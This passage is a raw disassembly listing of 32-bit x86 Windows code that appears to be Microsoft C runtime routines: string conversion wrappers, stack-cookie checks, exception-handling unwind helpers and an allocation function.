  406705:	ff 75 0c             	push   0xc(%ebp)
  406708:	50                   	push   %eax
  406709:	ff 75 18             	push   0x18(%ebp)
  40670c:	e8 73 11 00 00       	call   0x407884
  406711:	8b f0                	mov    %eax,%esi
  406713:	83 c4 18             	add    $0x18,%esp
  406716:	3b f3                	cmp    %ebx,%esi
  406718:	74 dc                	je     0x4066f6
  40671a:	89 75 0c             	mov    %esi,0xc(%ebp)
  40671d:	ff 75 14             	push   0x14(%ebp)
  406720:	ff 75 10             	push   0x10(%ebp)
  406723:	ff 75 0c             	push   0xc(%ebp)
  406726:	ff 75 08             	push   0x8(%ebp)
  406729:	ff 75 1c             	push   0x1c(%ebp)
  40672c:	ff 15 9c 90 40 00    	call   *0x40909c
  406732:	3b f3                	cmp    %ebx,%esi
  406734:	8b f8                	mov    %eax,%edi
  406736:	74 07                	je     0x40673f
  406738:	56                   	push   %esi
  406739:	e8 51 c5 ff ff       	call   0x402c8f
  40673e:	59                   	pop    %ecx
  40673f:	8b c7                	mov    %edi,%eax
  406741:	8d 65 ec             	lea    -0x14(%ebp),%esp
  406744:	5f                   	pop    %edi
  406745:	5e                   	pop    %esi
  406746:	5b                   	pop    %ebx
  406747:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40674a:	33 cd                	xor    %ebp,%ecx
  40674c:	e8 89 b8 ff ff       	call   0x401fda
  406751:	c9                   	leave
  406752:	c3                   	ret
  406753:	55                   	push   %ebp
  406754:	8b ec                	mov    %esp,%ebp
  406756:	83 ec 10             	sub    $0x10,%esp
  406759:	ff 75 08             	push   0x8(%ebp)
  40675c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40675f:	e8 03 d2 ff ff       	call   0x403967
  406764:	ff 75 24             	push   0x24(%ebp)
  406767:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40676a:	ff 75 20             	push   0x20(%ebp)
  40676d:	ff 75 1c             	push   0x1c(%ebp)
  406770:	ff 75 18             	push   0x18(%ebp)
  406773:	ff 75 14             	push   0x14(%ebp)
  406776:	ff 75 10             	push   0x10(%ebp)
  406779:	ff 75 0c             	push   0xc(%ebp)
  40677c:	e8 1a fe ff ff       	call   0x40659b
  406781:	83 c4 1c             	add    $0x1c,%esp
  406784:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  406788:	74 07                	je     0x406791
  40678a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40678d:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  406791:	c9                   	leave
  406792:	c3                   	ret
  406793:	cc                   	int3
  406794:	cc                   	int3
  406795:	cc                   	int3
  406796:	cc                   	int3
  406797:	cc                   	int3
  406798:	cc                   	int3
  406799:	cc                   	int3
  40679a:	cc                   	int3
  40679b:	cc                   	int3
  40679c:	cc                   	int3
  40679d:	cc                   	int3
  40679e:	cc                   	int3
  40679f:	cc                   	int3
  4067a0:	55                   	push   %ebp
  4067a1:	8b ec                	mov    %esp,%ebp
  4067a3:	56                   	push   %esi
  4067a4:	33 c0                	xor    %eax,%eax
  4067a6:	50                   	push   %eax
  4067a7:	50                   	push   %eax
  4067a8:	50                   	push   %eax
  4067a9:	50                   	push   %eax
  4067aa:	50                   	push   %eax
  4067ab:	50                   	push   %eax
  4067ac:	50                   	push   %eax
  4067ad:	50                   	push   %eax
  4067ae:	8b 55 0c             	mov    0xc(%ebp),%edx
  4067b1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4067b4:	8a 02                	mov    (%edx),%al
  4067b6:	0a c0                	or     %al,%al
  4067b8:	74 09                	je     0x4067c3
  4067ba:	83 c2 01             	add    $0x1,%edx
  4067bd:	0f ab 04 24          	bts    %eax,(%esp)
  4067c1:	eb f1                	jmp    0x4067b4
  4067c3:	8b 75 08             	mov    0x8(%ebp),%esi
  4067c6:	8b ff                	mov    %edi,%edi
  4067c8:	8a 06                	mov    (%esi),%al
  4067ca:	0a c0                	or     %al,%al
  4067cc:	74 0c                	je     0x4067da
  4067ce:	83 c6 01             	add    $0x1,%esi
  4067d1:	0f a3 04 24          	bt     %eax,(%esp)
  4067d5:	73 f1                	jae    0x4067c8
  4067d7:	8d 46 ff             	lea    -0x1(%esi),%eax
  4067da:	83 c4 20             	add    $0x20,%esp
  4067dd:	5e                   	pop    %esi
  4067de:	c9                   	leave
  4067df:	c3                   	ret
  4067e0:	55                   	push   %ebp
  4067e1:	8b ec                	mov    %esp,%ebp
  4067e3:	83 ec 14             	sub    $0x14,%esp
  4067e6:	a1 20 c0 40 00       	mov    0x40c020,%eax
  4067eb:	33 c5                	xor    %ebp,%eax
  4067ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4067f0:	53                   	push   %ebx
  4067f1:	56                   	push   %esi
  4067f2:	33 db                	xor    %ebx,%ebx
  4067f4:	39 1d b4 d6 40 00    	cmp    %ebx,0x40d6b4
  4067fa:	57                   	push   %edi
  4067fb:	8b f1                	mov    %ecx,%esi
  4067fd:	75 38                	jne    0x406837
  4067ff:	53                   	push   %ebx
  406800:	53                   	push   %ebx
  406801:	33 ff                	xor    %edi,%edi
  406803:	47                   	inc    %edi
  406804:	57                   	push   %edi
  406805:	68 b4 a4 40 00       	push   $0x40a4b4
  40680a:	68 00 01 00 00       	push   $0x100
  40680f:	53                   	push   %ebx
  406810:	ff 15 80 90 40 00    	call   *0x409080
  406816:	85 c0                	test   %eax,%eax
  406818:	74 08                	je     0x406822
  40681a:	89 3d b4 d6 40 00    	mov    %edi,0x40d6b4
  406820:	eb 15                	jmp    0x406837
  406822:	ff 15 c0 90 40 00    	call   *0x4090c0
  406828:	83 f8 78             	cmp    $0x78,%eax
  40682b:	75 0a                	jne    0x406837
  40682d:	c7 05 b4 d6 40 00 02 	movl   $0x2,0x40d6b4
  406834:	00 00 00 
  406837:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  40683a:	7e 22                	jle    0x40685e
  40683c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40683f:	8b 45 10             	mov    0x10(%ebp),%eax
  406842:	49                   	dec    %ecx
  406843:	38 18                	cmp    %bl,(%eax)
  406845:	74 08                	je     0x40684f
  406847:	40                   	inc    %eax
  406848:	3b cb                	cmp    %ebx,%ecx
  40684a:	75 f6                	jne    0x406842
  40684c:	83 c9 ff             	or     $0xffffffff,%ecx
  40684f:	8b 45 14             	mov    0x14(%ebp),%eax
  406852:	2b c1                	sub    %ecx,%eax
  406854:	48                   	dec    %eax
  406855:	3b 45 14             	cmp    0x14(%ebp),%eax
  406858:	7d 01                	jge    0x40685b
  40685a:	40                   	inc    %eax
  40685b:	89 45 14             	mov    %eax,0x14(%ebp)
  40685e:	a1 b4 d6 40 00       	mov    0x40d6b4,%eax
  406863:	83 f8 02             	cmp    $0x2,%eax
  406866:	0f 84 ab 01 00 00    	je     0x406a17
  40686c:	3b c3                	cmp    %ebx,%eax
  40686e:	0f 84 a3 01 00 00    	je     0x406a17
  406874:	83 f8 01             	cmp    $0x1,%eax
  406877:	0f 85 cb 01 00 00    	jne    0x406a48
  40687d:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  406880:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  406883:	75 08                	jne    0x40688d
  406885:	8b 06                	mov    (%esi),%eax
  406887:	8b 40 04             	mov    0x4(%eax),%eax
  40688a:	89 45 20             	mov    %eax,0x20(%ebp)
  40688d:	8b 35 98 90 40 00    	mov    0x409098,%esi
  406893:	33 c0                	xor    %eax,%eax
  406895:	39 5d 24             	cmp    %ebx,0x24(%ebp)
  406898:	53                   	push   %ebx
  406899:	53                   	push   %ebx
  40689a:	ff 75 14             	push   0x14(%ebp)
  40689d:	0f 95 c0             	setne  %al
  4068a0:	ff 75 10             	push   0x10(%ebp)
  4068a3:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  4068aa:	50                   	push   %eax
  4068ab:	ff 75 20             	push   0x20(%ebp)
  4068ae:	ff d6                	call   *%esi
  4068b0:	8b f8                	mov    %eax,%edi
  4068b2:	3b fb                	cmp    %ebx,%edi
  4068b4:	0f 84 8e 01 00 00    	je     0x406a48
  4068ba:	7e 43                	jle    0x4068ff
  4068bc:	6a e0                	push   $0xffffffe0
  4068be:	33 d2                	xor    %edx,%edx
  4068c0:	58                   	pop    %eax
  4068c1:	f7 f7                	div    %edi
  4068c3:	83 f8 02             	cmp    $0x2,%eax
  4068c6:	72 37                	jb     0x4068ff
  4068c8:	8d 44 3f 08          	lea    0x8(%edi,%edi,1),%eax
  4068cc:	3d 00 04 00 00       	cmp    $0x400,%eax
  4068d1:	77 13                	ja     0x4068e6
  4068d3:	e8 28 0f 00 00       	call   0x407800
  4068d8:	8b c4                	mov    %esp,%eax
  4068da:	3b c3                	cmp    %ebx,%eax
  4068dc:	74 1c                	je     0x4068fa
  4068de:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  4068e4:	eb 11                	jmp    0x4068f7
  4068e6:	50                   	push   %eax
  4068e7:	e8 80 c4 ff ff       	call   0x402d6c
  4068ec:	3b c3                	cmp    %ebx,%eax
  4068ee:	59                   	pop    %ecx
  4068ef:	74 09                	je     0x4068fa
  4068f1:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  4068f7:	83 c0 08             	add    $0x8,%eax
  4068fa:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4068fd:	eb 03                	jmp    0x406902
  4068ff:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  406902:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  406905:	0f 84 3d 01 00 00    	je     0x406a48
  40690b:	57                   	push   %edi
  40690c:	ff 75 f4             	push   -0xc(%ebp)
  40690f:	ff 75 14             	push   0x14(%ebp)
  406912:	ff 75 10             	push   0x10(%ebp)
  406915:	6a 01                	push   $0x1
  406917:	ff 75 20             	push   0x20(%ebp)
  40691a:	ff d6                	call   *%esi
  40691c:	85 c0                	test   %eax,%eax
  40691e:	0f 84 e2 00 00 00    	je     0x406a06
  406924:	8b 35 80 90 40 00    	mov    0x409080,%esi
  40692a:	53                   	push   %ebx
  40692b:	53                   	push   %ebx
  40692c:	57                   	push   %edi
  40692d:	ff 75 f4             	push   -0xc(%ebp)
  406930:	ff 75 0c             	push   0xc(%ebp)
  406933:	ff 75 08             	push   0x8(%ebp)
  406936:	ff d6                	call   *%esi
  406938:	8b c8                	mov    %eax,%ecx
  40693a:	3b cb                	cmp    %ebx,%ecx
  40693c:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40693f:	0f 84 c1 00 00 00    	je     0x406a06
  406945:	66 f7 45 0c 00 04    	testw  $0x400,0xc(%ebp)
  40694b:	74 29                	je     0x406976
  40694d:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  406950:	0f 84 b0 00 00 00    	je     0x406a06
  406956:	3b 4d 1c             	cmp    0x1c(%ebp),%ecx
  406959:	0f 8f a7 00 00 00    	jg     0x406a06
  40695f:	ff 75 1c             	push   0x1c(%ebp)
  406962:	ff 75 18             	push   0x18(%ebp)
  406965:	57                   	push   %edi
  406966:	ff 75 f4             	push   -0xc(%ebp)
  406969:	ff 75 0c             	push   0xc(%ebp)
  40696c:	ff 75 08             	push   0x8(%ebp)
  40696f:	ff d6                	call   *%esi
  406971:	e9 90 00 00 00       	jmp    0x406a06
  406976:	3b cb                	cmp    %ebx,%ecx
  406978:	7e 45                	jle    0x4069bf
  40697a:	6a e0                	push   $0xffffffe0
  40697c:	33 d2                	xor    %edx,%edx
  40697e:	58                   	pop    %eax
  40697f:	f7 f1                	div    %ecx
  406981:	83 f8 02             	cmp    $0x2,%eax
  406984:	72 39                	jb     0x4069bf
  406986:	8d 44 09 08          	lea    0x8(%ecx,%ecx,1),%eax
  40698a:	3d 00 04 00 00       	cmp    $0x400,%eax
  40698f:	77 16                	ja     0x4069a7
  406991:	e8 6a 0e 00 00       	call   0x407800
  406996:	8b f4                	mov    %esp,%esi
  406998:	3b f3                	cmp    %ebx,%esi
  40699a:	74 6a                	je     0x406a06
  40699c:	c7 06 cc cc 00 00    	movl   $0xcccc,(%esi)
  4069a2:	83 c6 08             	add    $0x8,%esi
  4069a5:	eb 1a                	jmp    0x4069c1
  4069a7:	50                   	push   %eax
  4069a8:	e8 bf c3 ff ff       	call   0x402d6c
  4069ad:	3b c3                	cmp    %ebx,%eax
  4069af:	59                   	pop    %ecx
  4069b0:	74 09                	je     0x4069bb
  4069b2:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  4069b8:	83 c0 08             	add    $0x8,%eax
  4069bb:	8b f0                	mov    %eax,%esi
  4069bd:	eb 02                	jmp    0x4069c1
  4069bf:	33 f6                	xor    %esi,%esi
  4069c1:	3b f3                	cmp    %ebx,%esi
  4069c3:	74 41                	je     0x406a06
  4069c5:	ff 75 f8             	push   -0x8(%ebp)
  4069c8:	56                   	push   %esi
  4069c9:	57                   	push   %edi
  4069ca:	ff 75 f4             	push   -0xc(%ebp)
  4069cd:	ff 75 0c             	push   0xc(%ebp)
  4069d0:	ff 75 08             	push   0x8(%ebp)
  4069d3:	ff 15 80 90 40 00    	call   *0x409080
  4069d9:	85 c0                	test   %eax,%eax
  4069db:	74 22                	je     0x4069ff
  4069dd:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  4069e0:	53                   	push   %ebx
  4069e1:	53                   	push   %ebx
  4069e2:	75 04                	jne    0x4069e8
  4069e4:	53                   	push   %ebx
  4069e5:	53                   	push   %ebx
  4069e6:	eb 06                	jmp    0x4069ee
  4069e8:	ff 75 1c             	push   0x1c(%ebp)
  4069eb:	ff 75 18             	push   0x18(%ebp)
  4069ee:	ff 75 f8             	push   -0x8(%ebp)
  4069f1:	56                   	push   %esi
  4069f2:	53                   	push   %ebx
  4069f3:	ff 75 20             	push   0x20(%ebp)
  4069f6:	ff 15 2c 91 40 00    	call   *0x40912c
  4069fc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4069ff:	56                   	push   %esi
  406a00:	e8 1e f9 ff ff       	call   0x406323
  406a05:	59                   	pop    %ecx
  406a06:	ff 75 f4             	push   -0xc(%ebp)
  406a09:	e8 15 f9 ff ff       	call   0x406323
  406a0e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406a11:	59                   	pop    %ecx
  406a12:	e9 59 01 00 00       	jmp    0x406b70
  406a17:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  406a1a:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  406a1d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  406a20:	75 08                	jne    0x406a2a
  406a22:	8b 06                	mov    (%esi),%eax
  406a24:	8b 40 14             	mov    0x14(%eax),%eax
  406a27:	89 45 08             	mov    %eax,0x8(%ebp)
  406a2a:	39 5d 20             	cmp    %ebx,0x20(%ebp)
  406a2d:	75 08                	jne    0x406a37
  406a2f:	8b 06                	mov    (%esi),%eax
  406a31:	8b 40 04             	mov    0x4(%eax),%eax
  406a34:	89 45 20             	mov    %eax,0x20(%ebp)
  406a37:	ff 75 08             	push   0x8(%ebp)
  406a3a:	e8 fe 0d 00 00       	call   0x40783d
  406a3f:	83 f8 ff             	cmp    $0xffffffff,%eax
  406a42:	59                   	pop    %ecx
  406a43:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406a46:	75 07                	jne    0x406a4f
  406a48:	33 c0                	xor    %eax,%eax
  406a4a:	e9 21 01 00 00       	jmp    0x406b70
  406a4f:	3b 45 20             	cmp    0x20(%ebp),%eax
  406a52:	0f 84 db 00 00 00    	je     0x406b33
  406a58:	53                   	push   %ebx
  406a59:	53                   	push   %ebx
  406a5a:	8d 4d 14             	lea    0x14(%ebp),%ecx
  406a5d:	51                   	push   %ecx
  406a5e:	ff 75 10             	push   0x10(%ebp)
  406a61:	50                   	push   %eax
  406a62:	ff 75 20             	push   0x20(%ebp)
  406a65:	e8 1a 0e 00 00       	call   0x407884
  406a6a:	83 c4 18             	add    $0x18,%esp
  406a6d:	3b c3                	cmp    %ebx,%eax
  406a6f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406a72:	74 d4                	je     0x406a48
  406a74:	8b 35 84 90 40 00    	mov    0x409084,%esi
  406a7a:	53                   	push   %ebx
  406a7b:	53                   	push   %ebx
  406a7c:	ff 75 14             	push   0x14(%ebp)
  406a7f:	50                   	push   %eax
  406a80:	ff 75 0c             	push   0xc(%ebp)
  406a83:	ff 75 08             	push   0x8(%ebp)
  406a86:	ff d6                	call   *%esi
  406a88:	3b c3                	cmp    %ebx,%eax
  406a8a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406a8d:	75 07                	jne    0x406a96
  406a8f:	33 f6                	xor    %esi,%esi
  406a91:	e9 b7 00 00 00       	jmp    0x406b4d
  406a96:	7e 3d                	jle    0x406ad5
  406a98:	83 f8 e0             	cmp    $0xffffffe0,%eax
  406a9b:	77 38                	ja     0x406ad5
  406a9d:	83 c0 08             	add    $0x8,%eax
  406aa0:	3d 00 04 00 00       	cmp    $0x400,%eax
  406aa5:	77 16                	ja     0x406abd
  406aa7:	e8 54 0d 00 00       	call   0x407800
  406aac:	8b fc                	mov    %esp,%edi
  406aae:	3b fb                	cmp    %ebx,%edi
  406ab0:	74 dd                	je     0x406a8f
  406ab2:	c7 07 cc cc 00 00    	movl   $0xcccc,(%edi)
  406ab8:	83 c7 08             	add    $0x8,%edi
  406abb:	eb 1a                	jmp    0x406ad7
  406abd:	50                   	push   %eax
  406abe:	e8 a9 c2 ff ff       	call   0x402d6c
  406ac3:	3b c3                	cmp    %ebx,%eax
  406ac5:	59                   	pop    %ecx
  406ac6:	74 09                	je     0x406ad1
  406ac8:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  406ace:	83 c0 08             	add    $0x8,%eax
  406ad1:	8b f8                	mov    %eax,%edi
  406ad3:	eb 02                	jmp    0x406ad7
  406ad5:	33 ff                	xor    %edi,%edi
  406ad7:	3b fb                	cmp    %ebx,%edi
  406ad9:	74 b4                	je     0x406a8f
  406adb:	ff 75 f8             	push   -0x8(%ebp)
  406ade:	53                   	push   %ebx
  406adf:	57                   	push   %edi
  406ae0:	e8 7b b4 ff ff       	call   0x401f60
  406ae5:	83 c4 0c             	add    $0xc,%esp
  406ae8:	ff 75 f8             	push   -0x8(%ebp)
  406aeb:	57                   	push   %edi
  406aec:	ff 75 14             	push   0x14(%ebp)
  406aef:	ff 75 f4             	push   -0xc(%ebp)
  406af2:	ff 75 0c             	push   0xc(%ebp)
  406af5:	ff 75 08             	push   0x8(%ebp)
  406af8:	ff d6                	call   *%esi
  406afa:	3b c3                	cmp    %ebx,%eax
  406afc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406aff:	75 04                	jne    0x406b05
  406b01:	33 f6                	xor    %esi,%esi
  406b03:	eb 25                	jmp    0x406b2a
  406b05:	ff 75 1c             	push   0x1c(%ebp)
  406b08:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406b0b:	ff 75 18             	push   0x18(%ebp)
  406b0e:	50                   	push   %eax
  406b0f:	57                   	push   %edi
  406b10:	ff 75 20             	push   0x20(%ebp)
  406b13:	ff 75 ec             	push   -0x14(%ebp)
  406b16:	e8 69 0d 00 00       	call   0x407884
  406b1b:	8b f0                	mov    %eax,%esi
  406b1d:	89 75 f0             	mov    %esi,-0x10(%ebp)
  406b20:	83 c4 18             	add    $0x18,%esp
  406b23:	f7 de                	neg    %esi
  406b25:	1b f6                	sbb    %esi,%esi
  406b27:	23 75 f8             	and    -0x8(%ebp),%esi
  406b2a:	57                   	push   %edi
  406b2b:	e8 f3 f7 ff ff       	call   0x406323
  406b30:	59                   	pop    %ecx
  406b31:	eb 1a                	jmp    0x406b4d
  406b33:	ff 75 1c             	push   0x1c(%ebp)
  406b36:	ff 75 18             	push   0x18(%ebp)
  406b39:	ff 75 14             	push   0x14(%ebp)
  406b3c:	ff 75 10             	push   0x10(%ebp)
  406b3f:	ff 75 0c             	push   0xc(%ebp)
  406b42:	ff 75 08             	push   0x8(%ebp)
  406b45:	ff 15 84 90 40 00    	call   *0x409084
  406b4b:	8b f0                	mov    %eax,%esi
  406b4d:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  406b50:	74 09                	je     0x406b5b
  406b52:	ff 75 f4             	push   -0xc(%ebp)
  406b55:	e8 35 c1 ff ff       	call   0x402c8f
  406b5a:	59                   	pop    %ecx
  406b5b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406b5e:	3b c3                	cmp    %ebx,%eax
  406b60:	74 0c                	je     0x406b6e
  406b62:	39 45 18             	cmp    %eax,0x18(%ebp)
  406b65:	74 07                	je     0x406b6e
  406b67:	50                   	push   %eax
  406b68:	e8 22 c1 ff ff       	call   0x402c8f
  406b6d:	59                   	pop    %ecx
  406b6e:	8b c6                	mov    %esi,%eax
  406b70:	8d 65 e0             	lea    -0x20(%ebp),%esp
  406b73:	5f                   	pop    %edi
  406b74:	5e                   	pop    %esi
  406b75:	5b                   	pop    %ebx
  406b76:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b79:	33 cd                	xor    %ebp,%ecx
  406b7b:	e8 5a b4 ff ff       	call   0x401fda
  406b80:	c9                   	leave
  406b81:	c3                   	ret
  406b82:	55                   	push   %ebp
  406b83:	8b ec                	mov    %esp,%ebp
  406b85:	83 ec 10             	sub    $0x10,%esp
  406b88:	ff 75 08             	push   0x8(%ebp)
  406b8b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406b8e:	e8 d4 cd ff ff       	call   0x403967
  406b93:	ff 75 28             	push   0x28(%ebp)
  406b96:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406b99:	ff 75 24             	push   0x24(%ebp)
  406b9c:	ff 75 20             	push   0x20(%ebp)
  406b9f:	ff 75 1c             	push   0x1c(%ebp)
  406ba2:	ff 75 18             	push   0x18(%ebp)
  406ba5:	ff 75 14             	push   0x14(%ebp)
  406ba8:	ff 75 10             	push   0x10(%ebp)
  406bab:	ff 75 0c             	push   0xc(%ebp)
  406bae:	e8 2d fc ff ff       	call   0x4067e0
  406bb3:	83 c4 20             	add    $0x20,%esp
  406bb6:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  406bba:	74 07                	je     0x406bc3
  406bbc:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406bbf:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  406bc3:	c9                   	leave
  406bc4:	c3                   	ret
  406bc5:	cc                   	int3
  406bc6:	cc                   	int3
  406bc7:	cc                   	int3
  406bc8:	53                   	push   %ebx
  406bc9:	56                   	push   %esi
  406bca:	57                   	push   %edi
  406bcb:	8b 54 24 10          	mov    0x10(%esp),%edx
  406bcf:	8b 44 24 14          	mov    0x14(%esp),%eax
  406bd3:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  406bd7:	55                   	push   %ebp
  406bd8:	52                   	push   %edx
  406bd9:	50                   	push   %eax
  406bda:	51                   	push   %ecx
  406bdb:	51                   	push   %ecx
  406bdc:	68 58 6c 40 00       	push   $0x406c58
  406be1:	64 ff 35 00 00 00 00 	push   %fs:0x0
  406be8:	a1 20 c0 40 00       	mov    0x40c020,%eax
  406bed:	33 c4                	xor    %esp,%eax
  406bef:	89 44 24 08          	mov    %eax,0x8(%esp)
  406bf3:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406bfa:	8b 44 24 30          	mov    0x30(%esp),%eax
  406bfe:	8b 58 08             	mov    0x8(%eax),%ebx
  406c01:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  406c05:	33 19                	xor    (%ecx),%ebx
  406c07:	8b 70 0c             	mov    0xc(%eax),%esi
  406c0a:	83 fe fe             	cmp    $0xfffffffe,%esi
  406c0d:	74 3b                	je     0x406c4a
  406c0f:	8b 54 24 34          	mov    0x34(%esp),%edx
  406c13:	83 fa fe             	cmp    $0xfffffffe,%edx
  406c16:	74 04                	je     0x406c1c
  406c18:	3b f2                	cmp    %edx,%esi
  406c1a:	76 2e                	jbe    0x406c4a
  406c1c:	8d 34 76             	lea    (%esi,%esi,2),%esi
  406c1f:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  406c23:	8b 0b                	mov    (%ebx),%ecx
  406c25:	89 48 0c             	mov    %ecx,0xc(%eax)
  406c28:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  406c2c:	75 cc                	jne    0x406bfa
  406c2e:	68 01 01 00 00       	push   $0x101
  406c33:	8b 43 08             	mov    0x8(%ebx),%eax
  406c36:	e8 12 0f 00 00       	call   0x407b4d
  406c3b:	b9 01 00 00 00       	mov    $0x1,%ecx
  406c40:	8b 43 08             	mov    0x8(%ebx),%eax
  406c43:	e8 24 0f 00 00       	call   0x407b6c
  406c48:	eb b0                	jmp    0x406bfa
  406c4a:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  406c51:	83 c4 18             	add    $0x18,%esp
  406c54:	5f                   	pop    %edi
  406c55:	5e                   	pop    %esi
  406c56:	5b                   	pop    %ebx
  406c57:	c3                   	ret
  406c58:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406c5c:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  406c63:	b8 01 00 00 00       	mov    $0x1,%eax
  406c68:	74 33                	je     0x406c9d
  406c6a:	8b 44 24 08          	mov    0x8(%esp),%eax
  406c6e:	8b 48 08             	mov    0x8(%eax),%ecx
  406c71:	33 c8                	xor    %eax,%ecx
  406c73:	e8 62 b3 ff ff       	call   0x401fda
  406c78:	55                   	push   %ebp
  406c79:	8b 68 18             	mov    0x18(%eax),%ebp
  406c7c:	ff 70 0c             	push   0xc(%eax)
  406c7f:	ff 70 10             	push   0x10(%eax)
  406c82:	ff 70 14             	push   0x14(%eax)
  406c85:	e8 3e ff ff ff       	call   0x406bc8
  406c8a:	83 c4 0c             	add    $0xc,%esp
  406c8d:	5d                   	pop    %ebp
  406c8e:	8b 44 24 08          	mov    0x8(%esp),%eax
  406c92:	8b 54 24 10          	mov    0x10(%esp),%edx
  406c96:	89 02                	mov    %eax,(%edx)
  406c98:	b8 03 00 00 00       	mov    $0x3,%eax
  406c9d:	c3                   	ret
  406c9e:	55                   	push   %ebp
  406c9f:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406ca3:	8b 29                	mov    (%ecx),%ebp
  406ca5:	ff 71 1c             	push   0x1c(%ecx)
  406ca8:	ff 71 18             	push   0x18(%ecx)
  406cab:	ff 71 28             	push   0x28(%ecx)
  406cae:	e8 15 ff ff ff       	call   0x406bc8
  406cb3:	83 c4 0c             	add    $0xc,%esp
  406cb6:	5d                   	pop    %ebp
  406cb7:	c2 04 00             	ret    $0x4
  406cba:	55                   	push   %ebp
  406cbb:	56                   	push   %esi
  406cbc:	57                   	push   %edi
  406cbd:	53                   	push   %ebx
  406cbe:	8b ea                	mov    %edx,%ebp
  406cc0:	33 c0                	xor    %eax,%eax
  406cc2:	33 db                	xor    %ebx,%ebx
  406cc4:	33 d2                	xor    %edx,%edx
  406cc6:	33 f6                	xor    %esi,%esi
  406cc8:	33 ff                	xor    %edi,%edi
  406cca:	ff d1                	call   *%ecx
  406ccc:	5b                   	pop    %ebx
  406ccd:	5f                   	pop    %edi
  406cce:	5e                   	pop    %esi
  406ccf:	5d                   	pop    %ebp
  406cd0:	c3                   	ret
  406cd1:	8b ea                	mov    %edx,%ebp
  406cd3:	8b f1                	mov    %ecx,%esi
  406cd5:	8b c1                	mov    %ecx,%eax
  406cd7:	6a 01                	push   $0x1
  406cd9:	e8 6f 0e 00 00       	call   0x407b4d
  406cde:	33 c0                	xor    %eax,%eax
  406ce0:	33 db                	xor    %ebx,%ebx
  406ce2:	33 c9                	xor    %ecx,%ecx
  406ce4:	33 d2                	xor    %edx,%edx
  406ce6:	33 ff                	xor    %edi,%edi
  406ce8:	ff e6                	jmp    *%esi
  406cea:	55                   	push   %ebp
  406ceb:	8b ec                	mov    %esp,%ebp
  406ced:	53                   	push   %ebx
  406cee:	56                   	push   %esi
  406cef:	57                   	push   %edi
  406cf0:	6a 00                	push   $0x0
  406cf2:	6a 00                	push   $0x0
  406cf4:	68 ff 6c 40 00       	push   $0x406cff
  406cf9:	51                   	push   %ecx
  406cfa:	e8 9f 13 00 00       	call   0x40809e
  406cff:	5f                   	pop    %edi
  406d00:	5e                   	pop    %esi
  406d01:	5b                   	pop    %ebx
  406d02:	5d                   	pop    %ebp
  406d03:	c3                   	ret
  406d04:	55                   	push   %ebp
  406d05:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  406d09:	52                   	push   %edx
  406d0a:	51                   	push   %ecx
  406d0b:	ff 74 24 14          	push   0x14(%esp)
  406d0f:	e8 b4 fe ff ff       	call   0x406bc8
  406d14:	83 c4 0c             	add    $0xc,%esp
  406d17:	5d                   	pop    %ebp
  406d18:	c2 08 00             	ret    $0x8
  406d1b:	6a 0c                	push   $0xc
  406d1d:	68 d0 af 40 00       	push   $0x40afd0
  406d22:	e8 2d d2 ff ff       	call   0x403f54
  406d27:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d2a:	33 ff                	xor    %edi,%edi
  406d2c:	3b cf                	cmp    %edi,%ecx
  406d2e:	76 2e                	jbe    0x406d5e
  406d30:	6a e0                	push   $0xffffffe0
  406d32:	58                   	pop    %eax
  406d33:	33 d2                	xor    %edx,%edx
  406d35:	f7 f1                	div    %ecx
  406d37:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406d3a:	1b c0                	sbb    %eax,%eax
  406d3c:	40                   	inc    %eax
  406d3d:	75 1f                	jne    0x406d5e
  406d3f:	e8 e9 d6 ff ff       	call   0x40442d
  406d44:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406d4a:	57                   	push   %edi
